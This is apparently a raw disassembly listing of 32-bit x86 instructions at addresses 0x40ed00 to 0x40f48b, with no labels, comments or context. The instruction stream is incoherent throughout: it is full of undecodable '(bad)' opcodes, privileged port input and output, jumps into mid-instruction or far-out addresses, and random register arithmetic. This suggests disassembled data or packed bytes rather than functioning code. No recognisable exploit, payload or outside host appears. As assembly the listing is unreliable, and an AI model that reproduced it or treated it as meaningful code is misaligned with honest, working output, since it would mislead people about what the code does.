  40ed00:	mov    eax,esi
  40ed02:	mov    eax,DWORD PTR [edi]
  40ed04:	mov    dh,0xd1
  40ed07:	push   es
  40ed08:	nop
  40ed09:	(bad)  
  40ed0a:	inc    DWORD PTR [ebx]
  40ed0c:	push   esi
  40ed0d:	leave  
  40ed0e:	iret   
  40ed0f:	add    al,0x46
  40ed11:	push   ebp
  40ed12:	in     eax,0xec
  40ed14:	push   ebp
  40ed15:	push   ecx
  40ed16:	inc    DWORD PTR [ebp+0x56]
  40ed19:	mov    DWORD PTR [esi-0x4],eax
  40ed1c:	loope  0x40ed73
  40ed1e:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ed24:	add    al,BYTE PTR [edx]
  40ed26:	mov    edx,DWORD PTR [ebp-0x17]
  40ed29:	cmp    edi,esi
  40ed2b:	jne    0x40ed2c
  40ed2d:	(bad)  
  40ed2e:	push   esi
  40ed2f:	pop    es
  40ed30:	push   ebp
  40ed31:	mov    ebp,esp
  40ed33:	or     BYTE PTR [ebp+0x41],al
  40ed36:	add    edi,edx
  40ed38:	sub    BYTE PTR [eax-0x4],al
  40ed3b:	ret    0xc275
  40ed3e:	add    DWORD PTR [eax],eax
  40ed40:	sbb    al,0x8b
  40ed42:	mov    edx,DWORD PTR [ecx+0x14]
  40ed45:	lea    edx,[edx-0x1ba7508]
  40ed4b:	push   esi
  40ed4c:	enter  0xd375,0xb8
  40ed50:	test   DWORD PTR [esi],0x6ce0750
  40ed56:	enter  0xd375,0x3b
  40ed5a:	neg    DWORD PTR [esi+0x50]
  40ed5d:	or     cl,dl
  40ed5f:	inc    edx
  40ed60:	(bad)  
  40ed61:	in     eax,dx
  40ed62:	in     al,dx
  40ed63:	(bad)  
  40ed64:	sub    eax,DWORD PTR [ebx]
  40ed66:	inc    eax
  40ed67:	in     eax,dx
  40ed68:	push   eax
  40ed69:	add    dl,BYTE PTR [eax-0x37]
  40ed6c:	push   edi
  40ed6d:	push   ebp
  40ed6e:	imul   ah
  40ed70:	adc    DWORD PTR [ecx-0x1],0x45
  40ed74:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ed7a:	lea    edi,[eax-0x7fff4ca]
  40ed80:	mov    eax,0x4550402
  40ed85:	cmp    ebp,ecx
  40ed87:	jne    0x40ed34
  40ed89:	mov    eax,DWORD PTR ds:0x241e808
  40ed8f:	loope  0x40ed91
  40ed91:	inc    eax
  40ed92:	stc    
  40ed93:	xlat   BYTE PTR ds:[ebx]
  40ed94:	ss inc ecx
  40ed96:	aas    
  40ed97:	in     eax,0x7d
  40ed99:	ret    0x8b
  40ed9c:	lock mov edi,DWORD PTR [ebp-0x18]
  40eda0:	and    edi,edi
  40eda2:	mov    edi,edi
  40eda4:	call   0xe40eee80
  40eda9:	push   es
  40edaa:	add    al,ch
  40edac:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40edb3:	(bad)  
  40edb4:	hlt    
  40edb5:	add    eax,0xffd3e87d
  40edba:	cmp    bh,0x8
  40edbd:	(bad)  
  40edbe:	fld    DWORD PTR [esi]
  40edc0:	out    dx,al
  40edc1:	call   0xff9fecc9
  40edc6:	cmp    al,0x46
  40edc8:	shr    esp,0x8
  40edcb:	(bad)  
  40edcc:	pop    es
  40edcd:	fisttp QWORD PTR [ebp+0xe577eff]
  40edd3:	push   ebx
  40edd4:	add    BYTE PTR [ebx+0x24008b56],cl
  40edda:	add    BYTE PTR [ebp+0x50],al
  40eddd:	push   eax
  40edde:	add    DWORD PTR [ebx+0x757d1834],ecx
  40ede4:	sub    edx,DWORD PTR [esi-0x24]
  40ede7:	jne    0x40ed9f
  40ede9:	lods   eax,DWORD PTR ds:[esi]
  40edea:	mov    edx,DWORD PTR [edx-0x34]
  40eded:	dec    esi
  40edee:	out    0x83,eax
  40edf0:	into   
  40edf1:	push   edi
  40edf3:	loopne 0x40edc3
  40edf5:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40edf9:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ee00:	rol    DWORD PTR [edx],0x8
  40ee03:	mov    esp,ecx
  40ee05:	cmp    DWORD PTR [ebx],0xc
  40ee08:	mov    esi,0x5001c0
  40ee0d:	push   eax
  40ee0e:	push   cs
  40ee0f:	push   eax
  40ee10:	(bad)  
  40ee11:	sub    edx,edi
  40ee13:	push   esi
  40ee14:	adc    al,0xcb
  40ee16:	ins    DWORD PTR es:[edi],dx
  40ee17:	mov    eax,0x203e8
  40ee1c:	add    al,ah
  40ee1e:	inc    esi
  40ee1f:	mov    al,ch
  40ee21:	pop    es
  40ee22:	add    DWORD PTR [eax],0x1
  40ee25:	add    dh,al
  40ee27:	add    ah,ch
  40ee29:	rol    DWORD PTR [edx-0xd],1
  40ee2c:	cli    
  40ee2d:	push   0x4a
  40ee2f:	pop    ecx
  40ee30:	retf   0xfe6
  40ee33:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ee39:	(bad)  
  40ee3a:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ee40:	(bad)  
  40ee41:	sub    ebp,DWORD PTR [ebx]
  40ee43:	and    al,0x52
  40ee45:	(bad)  
  40ee46:	dec    edi
  40ee47:	inc    ebp
  40ee48:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ee4f:	add    BYTE PTR [ebp-0x7b],dh
  40ee52:	pop    eax
  40ee53:	add    BYTE PTR [edx+0x0],bl
  40ee56:	pop    edx
  40ee57:	dec    ebp
  40ee58:	jmp    DWORD PTR [ebx]
  40ee5a:	and    al,0xec
  40ee5c:	push   edx
  40ee5d:	out    0x64,eax
  40ee5f:	jmp    0xd3f2e464
  40ee64:	jmp    0x40eebe
  40ee66:	mov    al,0xfe
  40ee68:	dec    BYTE PTR [ebp-0x18fd8018]
  40ee6e:	add    BYTE PTR [esi+ebp*1],bh
  40ee71:	pop    edx
  40ee72:	icebp  
  40ee73:	mov    eax,cs
  40ee75:	ins    BYTE PTR es:[edi],dx
  40ee76:	adc    eax,0x75510000
  40ee7b:	mov    esi,0x70158
  40ee80:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ee86:	mov    edi,esp
  40ee88:	cld    
  40ee89:	jge    0x40ef00
  40ee8b:	(bad)  
  40ee8d:	aas    
  40ee8e:	and    al,0x6d
  40ee90:	adc    cl,0x1
  40ee93:	mov    eax,DWORD PTR [eax]
  40ee95:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ee9b:	dec    ebp
  40ee9c:	add    eax,ebp
  40ee9e:	add    BYTE PTR [edx],al
  40eea0:	fadd   DWORD PTR [eax]
  40eea2:	stc    
  40eea3:	enter  0xee00,0x8b
  40eea7:	sbb    eax,0x1
  40eeaa:	sbb    esi,ecx
  40eeac:	in     al,0x0
  40eeae:	in     eax,dx
  40eeaf:	add    BYTE PTR [eax],al
  40eeb1:	jne    0x40ee3e
  40eeb3:	cmp    edx,esp
  40eeb5:	jb     0x40eec0
  40eeb7:	jmp    0x40ef2e
  40eeb9:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eebf:	add    BYTE PTR [ebx+0x4d83d840],cl
  40eec5:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40eecb:	jb     0x40ee56
  40eecd:	pop    edx
  40eece:	fadd   QWORD PTR [ebx-0x7445faa1]
  40eed4:	or     dh,BYTE PTR [edx+0x0]
  40eed7:	inc    edx
  40eed8:	or     dl,bh
  40eeda:	xlat   BYTE PTR ds:[ebx]
  40eedb:	dec    edx
  40eedc:	push   edi
  40eedd:	add    al,0x7
  40eedf:	leave  
  40eee0:	rol    DWORD PTR [edx+eax*1],0x7
  40eee4:	add    ecx,ecx
  40eee6:	mov    edx,ecx
  40eee8:	int3   
  40eee9:	jmp    0x40eea9
  40eeeb:	mov    al,0x0
  40eeed:	(bad)  
  40eeee:	jne    0x40eed8
  40eef0:	mov    eax,DWORD PTR [edx]
  40eef2:	call   0xc1556bf7
  40eef7:	pop    edi
  40eef8:	add    ebx,DWORD PTR [ecx-0x37]
  40eefb:	pop    ecx
  40eefc:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40ef03:	push   es
  40ef04:	mov    eax,DWORD PTR [eax]
  40ef06:	int3   
  40ef07:	add    ch,al
  40ef09:	jae    0x40eef3
  40ef0b:	int    0x1
  40ef0d:	enter  0x3000,0x18
  40ef11:	add    BYTE PTR [ebp+0x75],al
  40ef14:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ef1a:	push   0x2
  40ef1c:	pop    ecx
  40ef1d:	add    BYTE PTR [eax],cl
  40ef1f:	push   ebx
  40ef20:	lea    edi,[edi+eax*2]
  40ef23:	mov    al,0x1
  40ef25:	jb     0x40ef27
  40ef27:	mov    al,0x10
  40ef29:	push   eax
  40ef2a:	add    al,0x75
  40ef2c:	add    BYTE PTR [ebx],ch
  40ef2e:	add    ebx,esp
  40ef30:	int3   
  40ef31:	jne    0x40ef43
  40ef33:	movsx  edx,cl
  40ef36:	add    DWORD PTR [eax],eax
  40ef38:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ef3f:	mov    gs,edi
  40ef41:	add    BYTE PTR [eax-0x50],ch
  40ef44:	add    al,ch
  40ef46:	mov    eax,DWORD PTR [ecx]
  40ef48:	sub    eax,DWORD PTR [eax]
  40ef4a:	jb     0x40efc1
  40ef4c:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ef50:	jge    0x40ef3a
  40ef52:	add    al,0x1
  40ef54:	add    DWORD PTR [eax],0x0
  40ef57:	jne    0x40ef59
  40ef59:	je     0x40efa0
  40ef5b:	mov    eax,DWORD PTR [edi]
  40ef5d:	ror    BYTE PTR [ebp+0x4d],1
  40ef60:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ef67:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ef6d:	mov    DWORD PTR [ebx],ebp
  40ef6f:	fadd   DWORD PTR [eax+0x75]
  40ef72:	inc    eax
  40ef73:	pop    eax
  40ef74:	lea    ebx,[ecx+0x4f]
  40ef77:	push   0xb1000003
  40ef7c:	out    dx,eax
  40ef7d:	add    ebp,DWORD PTR [edx+edx*2]
  40ef80:	add    BYTE PTR [ebx+ecx*4],bh
  40ef83:	mov    ch,BYTE PTR [ebx]
  40ef85:	jb     0x40eff9
  40ef87:	add    al,0x89
  40ef89:	push   eax
  40ef8a:	call   0x84293cfc
  40ef8f:	add    DWORD PTR [eax+eax*1],eax
  40ef92:	jae    0x40efa8
  40ef94:	icebp  
  40ef95:	inc    ebp
  40ef96:	mov    eax,DWORD PTR gs:[ecx]
  40ef99:	int3   
  40ef9a:	out    dx,al
  40ef9b:	loopne 0x40efea
  40ef9d:	sub    eax,DWORD PTR [edx]
  40ef9f:	push   0xffffff83
  40efa1:	pop    esi
  40efa2:	push   cs
  40efa3:	jl     0x40efbe
  40efa5:	add    al,0xaf
  40efa7:	xor    eax,0x832b6d00
  40efac:	mov    eax,DWORD PTR [edx]
  40efae:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40efb4:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40efba:	inc    ebp
  40efbb:	shr    ebx,0x3
  40efbe:	or     DWORD PTR [eax],0x4
  40efc1:	push   0xffffffa5
  40efc3:	pop    esi
  40efc4:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40efcb:	jmp    0x40f02a
  40efcd:	mov    edi,0xff0272
  40efd2:	fdivr  QWORD PTR [ebp+0x5d]
  40efd5:	push   0x4e
  40efd7:	pop    ecx
  40efd8:	call   0x4133dd
  40efdd:	mov    DWORD PTR [ebx],eax
  40efdf:	in     al,0xc8
  40efe1:	rol    BYTE PTR [ebp-0x75],0xc1
  40efe5:	call   0xaaf1c6
  40efea:	pop    esi
  40efeb:	enter  0xceff,0x8b
  40efef:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eff3:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40effa:	je     0x40effc
  40effc:	or     DWORD PTR [ebx-0x74183b24],eax
  40f002:	jne    0x40efe8
  40f004:	jmp    0x40efff
  40f006:	push   DWORD PTR [edx-0x24]
  40f009:	push   0x4d
  40f00b:	pop    ecx
  40f00c:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40f010:	jge    0x40f018
  40f012:	mov    eax,eax
  40f014:	sub    ebp,DWORD PTR [edx+0x24]
  40f017:	pop    esi
  40f018:	inc    ebp
  40f019:	mov    esp,0x8b6077
  40f01e:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40f024:	lods   al,BYTE PTR ds:[esi]
  40f025:	add    BYTE PTR [ebx],bh
  40f027:	enter  0xce73,0x49
  40f02b:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40f033:	stc    
  40f034:	jge    0x40f0a8
  40f036:	jnp    0xdd407397
  40f03c:	call   0xc3f112
  40f041:	fadd   st(0),st
  40f043:	dec    esi
  40f044:	ins    BYTE PTR es:[edi],dx
  40f045:	stc    
  40f046:	cmp    al,0x73
  40f048:	push   ebp
  40f049:	mov    eax,0xf8028b
  40f04e:	jne    0x40f011
  40f050:	mov    esi,ecx
  40f052:	mov    esp,DWORD PTR [ebp+0x2c]
  40f055:	add    edi,DWORD PTR [ebp-0x24]
  40f058:	sub    esp,eax
  40f05a:	and    al,0x45
  40f05c:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40f062:	sbb    al,0xee
  40f064:	pop    esi
  40f065:	call   0x80f095
  40f06a:	fsubr  st,st(3)
  40f06c:	sti    
  40f06d:	add    BYTE PTR gs:[ecx],bh
  40f070:	add    eax,esp
  40f072:	add    DWORD PTR [esi],eax
  40f074:	rol    DWORD PTR [ebp+0x8],0x29
  40f078:	mov    esp,eax
  40f07a:	clc    
  40f07b:	jne    0x40f0f2
  40f07d:	mov    eax,0x8b0673
  40f082:	loopne 0x40f0c9
  40f084:	loopne 0x40f00f
  40f086:	lods   al,BYTE PTR ds:[esi]
  40f087:	int3   
  40f088:	inc    ebp
  40f089:	mov    DWORD PTR gs:[eax+edi*8],eax
  40f08d:	add    al,0xc3
  40f08f:	sub    ecx,DWORD PTR [ebp+0x47]
  40f092:	(bad)  
  40f094:	shr    BYTE PTR [ebp-0x1f],0xe8
  40f098:	add    eax,DWORD PTR [eax]
  40f09a:	call   0x642b19f
  40f09f:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40f0a5:	dec    esi
  40f0a6:	ins    DWORD PTR es:[edi],dx
  40f0a7:	in     al,dx
  40f0a8:	lea    eax,[eax]
  40f0aa:	inc    ebp
  40f0ab:	inc    ebp
  40f0ac:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40f0b2:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40f0bc:	and    al,0xdc
  40f0be:	ror    DWORD PTR [edx+0x24],0xf7
  40f0c2:	or     BYTE PTR [ebp+0x4c],dh
  40f0c5:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40f0c9:	stos   BYTE PTR es:[edi],al
  40f0ca:	adc    edx,edi
  40f0cc:	inc    esp
  40f0cd:	add    edi,DWORD PTR [eax]
  40f0cf:	jne    0x40f0b4
  40f0d1:	mov    DWORD PTR [eax-0x7449db04],ecx
  40f0d7:	cmp    ecx,DWORD PTR [edi]
  40f0d9:	sub    BYTE PTR [ebp-0x7e],dl
  40f0dc:	sar    ebp,0xb
  40f0df:	jmp    FWORD PTR [edi+0x2400392a]
  40f0e5:	sub    esi,DWORD PTR [ebx-0x73]
  40f0e8:	mov    esp,DWORD PTR [ecx+edi*4]
  40f0eb:	mov    ecx,DWORD PTR [eax]
  40f0ed:	and    BYTE PTR [eax],al
  40f0ef:	jne    0x40f0bb
  40f0f1:	sub    ebp,ecx
  40f0f3:	sbb    BYTE PTR [esi+0x32],ah
  40f0f6:	dec    ebp
  40f0f7:	push   ebp
  40f0f8:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40f0fe:	ret    
  40f0ff:	mov    edx,ebp
  40f101:	leave  
  40f102:	sub    DWORD PTR [esi+0x24],ebx
  40f105:	ret    0x2b
  40f108:	pop    ax
  40f10a:	push   ebp
  40f10b:	rol    BYTE PTR [ebx],0xeb
  40f10e:	add    DWORD PTR [ecx+0x6c0001],0x40
  40f115:	jb     0x40f16c
  40f117:	ret    
  40f118:	in     al,dx
  40f119:	jecxz  0x40f0a6
  40f11b:	push   esi
  40f11c:	xchg   esp,eax
  40f11d:	jne    0x40f11f
  40f11f:	cmp    edx,DWORD PTR [esi+0x1c]
  40f122:	jne    0x40f108
  40f124:	mov    eax,DWORD PTR [ebp-0x77]
  40f127:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f12e:	mov    esi,DWORD PTR [ebp-0x75]
  40f131:	pop    esi
  40f132:	nop
  40f133:	mov    eax,DWORD PTR [eax]
  40f135:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f13b:	add    al,0x0
  40f13d:	inc    ebp
  40f13e:	mov    eax,DWORD PTR [ebx]
  40f140:	mov    ebp,ebx
  40f142:	cmp    al,0xf
  40f144:	or     al,al
  40f146:	inc    ebp
  40f147:	inc    ebp
  40f148:	xor    eax,0x8bc89c8b
  40f14d:	ins    BYTE PTR es:[edi],dx
  40f14e:	cld    
  40f14f:	add    BYTE PTR [edi+0x566c16c0],dh
  40f155:	add    BYTE PTR [ecx-0x5],dl
  40f158:	add    eax,0x17200
  40f15d:	sbb    al,0x85
  40f15f:	dec    esp
  40f160:	je     0x40f19a
  40f162:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f166:	add    BYTE PTR [ebx],bh
  40f168:	(bad)  
  40f169:	and    al,0x32
  40f16b:	jae    0x40f109
  40f16d:	mov    cl,cl
  40f16f:	inc    DWORD PTR [esp]
  40f172:	push   ebp
  40f173:	shr    esp,0x8
  40f176:	in     al,dx
  40f177:	push   esp
  40f178:	add    DWORD PTR [eax],esp
  40f17a:	add    bl,cl
  40f17c:	inc    ebp
  40f17d:	mov    bh,0x53
  40f17f:	add    BYTE PTR [ebp-0x17],al
  40f182:	push   esi
  40f183:	cmovne ecx,edx
  40f186:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f18a:	push   edi
  40f18b:	pop    ss
  40f18c:	xor    eax,0x89009cd9
  40f191:	add    ah,bh
  40f193:	sub    eax,DWORD PTR [ebp-0x3f]
  40f196:	aad    0x5
  40f198:	inc    ebp
  40f199:	add    edx,edx
  40f19b:	add    BYTE PTR [ebp-0x40],al
  40f19e:	xlat   BYTE PTR ds:[ebx]
  40f19f:	ins    BYTE PTR es:[edi],dx
  40f1a0:	inc    ebp
  40f1a1:	inc    eax
  40f1a2:	and    ecx,eax
  40f1a4:	dec    eax
  40f1a5:	add    eax,0x20204c45
  40f1aa:	inc    ebp
  40f1ab:	fnstcw WORD PTR [esi+0x29]
  40f1ae:	leave  
  40f1af:	add    BYTE PTR [esi+0xc000c0],bh
  40f1b5:	lea    eax,[esp-0x34]
  40f1b9:	ret    
  40f1ba:	mov    dh,0x8b
  40f1bc:	xor    edx,DWORD PTR [ecx+0x3]
  40f1bf:	mov    al,BYTE PTR [ecx+0x1]
  40f1c2:	sbb    BYTE PTR [eax],al
  40f1c4:	stc    
  40f1c5:	mov    esi,DWORD PTR [edx+0x8]
  40f1c8:	(bad)  
  40f1c9:	les    esi,FWORD PTR ss:[ecx]
  40f1cc:	(bad)  
  40f1cd:	mov    al,ch
  40f1cf:	add    esi,eax
  40f1d1:	add    dh,al
  40f1d3:	or     esi,eax
  40f1d5:	mov    dl,0xc7
  40f1d7:	add    esi,eax
  40f1d9:	add    al,cl
  40f1db:	push   cs
  40f1dc:	mov    BYTE PTR [edx+0xc601c9],0xca
  40f1e3:	or     BYTE PTR [ebx],dh
  40f1e5:	dec    ecx
  40f1e6:	lea    eax,[ebx]
  40f1e8:	or     eax,0x18fc0fc7
  40f1ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1ee:	(bad)  
  40f1f0:	fiadd  WORD PTR [ebp-0x78]
  40f1f3:	jae    0xed75f942
  40f1f9:	or     BYTE PTR [ebp+0x7],al
  40f1fc:	loope  0x40f19b
  40f1fe:	inc    ebp
  40f1ff:	xor    dl,dh
  40f201:	pop    esi
  40f202:	inc    ebp
  40f203:	shr    edx,0xc
  40f206:	inc    ebp
  40f207:	and    ch,0x1
  40f20a:	inc    ebp
  40f20b:	add    bh,bl
  40f20d:	add    BYTE PTR [ebp-0x7b],al
  40f210:	out    dx,al
  40f211:	clc    
  40f212:	inc    ebp
  40f213:	ret    0xd7
  40f216:	inc    ebp
  40f217:	mov    edi,DWORD PTR [esi-0x7f]
  40f21a:	leave  
  40f21b:	sub    al,0x44
  40f21d:	add    BYTE PTR [ebx+ecx*4-0x76cce34a],bh
  40f224:	add    ebx,DWORD PTR [ecx+eax*2]
  40f227:	(bad)  
  40f228:	sbb    al,ah
  40f22a:	stc    
  40f22b:	test   DWORD PTR [edx-0x8],esi
  40f22e:	lea    edi,[edi-0x7007aa4]
  40f234:	mov    DWORD PTR [ebp-0x24],edi
  40f237:	(bad)  
  40f238:	dec    ebp
  40f239:	int3   
  40f23a:	mov    eax,0x71cdfcc6
  40f23f:	mov    BYTE PTR [ecx],0xce
  40f242:	(bad)  
  40f243:	(bad)  
  40f244:	dec    edi
  40f246:	jmp    FWORD PTR [edx-0x38]
  40f249:	(bad)  
  40f24a:	or     dl,al
  40f24c:	jge    0x40f214
  40f24e:	(bad)  
  40f24f:	shl    esp,1
  40f251:	xor    eax,DWORD PTR [ebp+0x45caf85a]
  40f257:	add    BYTE PTR [ebx+0xd8c8d],cl
  40f25d:	rdpmc  
  40f25f:	sbb    BYTE PTR [edi+0x7de08da],bh
  40f265:	mov    BYTE PTR [ebp+0x39063283],bl
  40f26b:	in     eax,dx
  40f26c:	cmovne ebx,DWORD PTR [edx]
  40f26f:	jecxz  0x40f271
  40f271:	inc    ebp
  40f272:	mov    esp,ecx
  40f274:	sbb    al,0x45
  40f276:	mov    ebx,edx
  40f278:	add    DWORD PTR [ebp+0x0],eax
  40f27b:	loopne 0x40f27e
  40f27d:	inc    ebp
  40f27e:	dec    ebp
  40f27f:	and    DWORD PTR [ebx+0x208045],ecx
  40f285:	inc    ebp
  40f286:	mov    DWORD PTR [esi+0x6a],edi
  40f289:	leave  
  40f28a:	mov    DWORD PTR [esp+edx*8-0x3c],0x33e5b6d6
  40f292:	inc    ebp
  40f293:	add    ebx,edi
  40f295:	inc    ecx
  40f296:	xlat   BYTE PTR ds:[ebx]
  40f297:	sbb    BYTE PTR [ebp-0x758d2b07],cl
  40f29d:	(bad)  
  40f29e:	xor    bh,BYTE PTR [eax+eax*4+0x8bd36c6]
  40f2a5:	(bad)  
  40f2a6:	dec    esi
  40f2a7:	mov    esi,0xbf45c6f3
  40f2ac:	mov    esi,eax
  40f2ae:	fadd   st,st(0)
  40f2b0:	inc    esi
  40f2b2:	(bad)  
  40f2b3:	rcl    esp,0xc6
  40f2b6:	inc    edx
  40f2b8:	push   eax
  40f2b9:	mov    BYTE PTR [ebp-0x3d],0x33
  40f2bd:	xor    eax,DWORD PTR [ebx]
  40f2bf:	lea    edx,[eax+0xd]
  40f2c2:	inc    ebp
  40f2c3:	jae    0x8c1b58e1
  40f2c9:	ficomp WORD PTR [eax+ecx*4]
  40f2cc:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f2d3:	test   esi,edi
  40f2d5:	(bad)  
  40f2d6:	(bad)  
  40f2d7:	inc    DWORD PTR [eax]
  40f2d9:	inc    ebp
  40f2da:	add    BYTE PTR [ebx-0x10aa23d0],cl
  40f2e0:	mov    edx,DWORD PTR [ebx]
  40f2e2:	cld    
  40f2e3:	mov    edi,ecx
  40f2e5:	mov    ecx,ebx
  40f2e7:	pop    esp
  40f2e8:	sar    edi,0x1e
  40f2eb:	cmp    ebp,esp
  40f2ed:	jne    0x40f362
  40f2ef:	mov    DWORD PTR ds:0x22450be4,ecx
  40f2f5:	loopne 0x40f2e3
  40f2f7:	pushf  
  40f2f8:	jae    0x40f285
  40f2fa:	add    eax,0x3388e91c
  40f2ff:	add    esp,ebp
  40f301:	add    BYTE PTR [ebx-0x40],dh
  40f304:	jmp    0x91f35f
  40f309:	mov    ebx,0x6a7275
  40f30e:	pop    ecx
  40f30f:	add    DWORD PTR [ebp+eax*4-0x77],esi
  40f313:	add    bh,BYTE PTR [eax+0x0]
  40f316:	dec    DWORD PTR [ebp+0x66]
  40f319:	mov    ecx,DWORD PTR [ebp-0xff0084]
  40f31f:	mov    DWORD PTR [edx-0x75],ebp
  40f322:	data16 sbb al,0x8d
  40f325:	mov    edi,edi
  40f327:	add    edi,edi
  40f329:	add    BYTE PTR [edx+0x1],ch
  40f32c:	data16 or BYTE PTR [ebp-0x1e00bb],cl
  40f333:	jmp    0xee6a:0xd84dc766
  40f33a:	pop    ecx
  40f33b:	jle    0x40f2c6
  40f33d:	inc    ebp
  40f33e:	sbb    BYTE PTR [esi-0x37],0x8
  40f342:	test   edx,ecx
  40f344:	(bad)  
  40f345:	jmp    0x41017c49
  40f34a:	push   ebp
  40f34b:	jne    0x40f3b3
  40f34d:	lea    ecx,[ebp-0x2c]
  40f350:	mov    DWORD PTR [ebp-0x200158],0xfe4585d6
  40f35a:	sar    bh,0xeb
  40f35d:	mov    eax,edi
  40f35f:	loopne 0x40f311
  40f361:	(bad)  
  40f362:	rol    ebx,cl
  40f364:	jmp    0xe9c0:0xdf1c458b
  40f36b:	push   eax
  40f36c:	inc    bp
  40f36e:	inc    ebp
  40f36f:	mov    eax,ebp
  40f371:	cwde   
  40f372:	mov    DWORD PTR [eax],0xd4ffc7d4
  40f378:	add    bh,bh
  40f37a:	add    BYTE PTR [ecx],al
  40f37c:	call   0x1400b81
  40f381:	inc    DWORD PTR [ebp-0xb201f8]
  40f387:	xor    eax,DWORD PTR [ebp-0xc401fd]
  40f38d:	jne    0x40f31a
  40f38f:	mov    eax,ds:0x33c70be0
  40f394:	ret    
  40f395:	out    dx,eax
  40f396:	mov    edx,DWORD PTR ds:0xbc0a31c
  40f39c:	push   eax
  40f39d:	xor    eax,DWORD PTR [ebp-0x71]
  40f3a0:	mov    esi,DWORD PTR [edx-0x68]
  40f3a3:	mov    ds:0x33ff0b00,eax
  40f3a8:	(bad)  
  40f3a9:	mov    ecx,0x8b8d0008
  40f3ae:	call   FWORD PTR [edi+edi*8]
  40f3b1:	and    bh,bh
  40f3b3:	push   0x66
  40f3b5:	mov    bp,0xff8d
  40f3b9:	(bad)  
  40f3ba:	(bad)  
  40f3bb:	dec    DWORD PTR [edi]
  40f3bd:	mov    DWORD PTR [edx],eax
  40f3bf:	jp     0x40f3c1
  40f3c1:	(bad)  
  40f3c2:	mov    ecx,0x774f59
  40f3c7:	mov    ecx,eax
  40f3c9:	jl     0x40f354
  40f3cb:	dec    DWORD PTR [eax-0x74c73fa7]
  40f3d1:	mov    DWORD PTR [esi+0x7e],esp
  40f3d4:	push   ebp
  40f3d5:	dec    DWORD PTR [ebp-0x7676f2a7]
  40f3db:	or     BYTE PTR [ebx+eiz*2+0x4d6666c2],0x55
  40f3e3:	xor    ecx,DWORD PTR [ebp-0x7627e877]
  40f3e9:	call   DWORD PTR [eax+0x668dc233]
  40f3ef:	test   al,0x55
  40f3f1:	mov    DWORD PTR [ebp-0x76bade7c],ecx
  40f3f7:	into   
  40f3f8:	xchg   esp,eax
  40f3f9:	loop   0x40f384
  40f3fb:	(bad)  
  40f3fc:	xchg   esi,eax
  40f3fd:	lods   al,BYTE PTR ds:[esi]
  40f3fe:	ret    0x8bd3
  40f401:	in     eax,dx
  40f402:	inc    bp
  40f404:	dec    ebp
  40f405:	in     al,0xb9
  40f407:	xor    BYTE PTR [edi-0x39],cl
  40f40a:	add    BYTE PTR [ecx+esi*8+0x64e189ec],dh
  40f411:	(bad)  
  40f412:	(bad)  
  40f413:	mov    eax,0x85667e8b
  40f418:	mov    ch,0xfe
  40f41a:	(bad)  
  40f41b:	(bad)  
  40f41c:	inc    DWORD PTR [eax]
  40f41e:	jno    0x40f420
  40f420:	data16 mov bl,0xb5
  40f423:	add    bh,bh
  40f425:	mov    edi,edi
  40f427:	fmul   QWORD PTR [ecx-0x729501]
  40f42d:	aam    0x8d
  40f42f:	call   edi
  40f431:	push   eax
  40f432:	mov    DWORD PTR [ebp+0x6c],eax
  40f435:	xor    edi,edi
  40f437:	add    eax,DWORD PTR [ebx-0x76bafcb0]
  40f43d:	sub    DWORD PTR [esi+0x44],0xffffffff
  40f441:	mov    ecx,DWORD PTR [ebp-0x767f1ee4]
  40f447:	add    DWORD PTR [eax+0x0],esi
  40f44a:	push   DWORD PTR [eax]
  40f44c:	push   bp
  40f44e:	lea    ecx,[ebp-0x8701]
  40f454:	mov    DWORD PTR [ecx+0x74],edx
  40f457:	sar    bh,1
  40f459:	or     DWORD PTR [ebx-0x48000386],0x77
  40f460:	fs test edi,edi
  40f463:	add    al,0x33
  40f465:	add    BYTE PTR [ebx],al
  40f467:	adc    dh,BYTE PTR [ebx]
  40f469:	add    BYTE PTR [esi-0x75],ah
  40f46c:	test   DWORD PTR [esi-0x1],esp
  40f46f:	inc    ebp
  40f470:	inc    DWORD PTR [ebx-0x2ff00abb]
  40f476:	dec    ebp
  40f477:	mov    DWORD PTR [ebx],esi
  40f479:	mov    al,BYTE PTR [ebx]
  40f47b:	push   ecx
  40f47c:	xor    esp,DWORD PTR [esi+0x66]
  40f47f:	push   ebp
  40f480:	inc    ebp
  40f481:	xor    DWORD PTR [ebx],0x8
  40f484:	mov    WORD PTR [ebp-0x72],ax
  40f488:	push   cx
  40f48a:	inc    ebp
  40f48b:	adc    WORD PTR [ebp-0x64],0xff83
